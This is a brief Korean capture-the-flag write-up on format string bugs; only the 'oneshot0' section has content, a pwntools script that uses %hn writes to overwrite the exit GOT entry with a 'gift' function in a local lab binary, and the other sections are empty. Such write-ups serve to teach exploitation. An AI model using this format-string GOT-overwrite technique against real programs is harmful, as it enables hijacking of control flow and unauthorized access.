# fsb

## oneshot0

주어진 gift 함수를 실행하면 된다. PIE가 없고 partial RELRO이므로 exit 함수의 got를 gift함수의 주소로 덮어쓸 수 있는 것으로 보인다.

```python

from pwn import *

# context.log_level = 'debug'

e = ELF("./oneshot")
p = process(e.path)


p.recvuntil(b"\n\n")
payload = f'%{e.symbols["gift"] >> 16}c'.encode()
payload += b"%10$hn"
payload += f"%{(e.symbols['gift'] & 0xffff) - (e.symbols['gift'] >> 16)}c".encode()
payload += b"%11$hn"
payload = payload.ljust(0x20, b"\x00")
payload += p64(e.got["exit"] + 2)
payload += p64(e.got["exit"])
p.send(payload)

p.interactive()


```


## oneshot1




## oneshot2




## oneshot3





## oneshot4
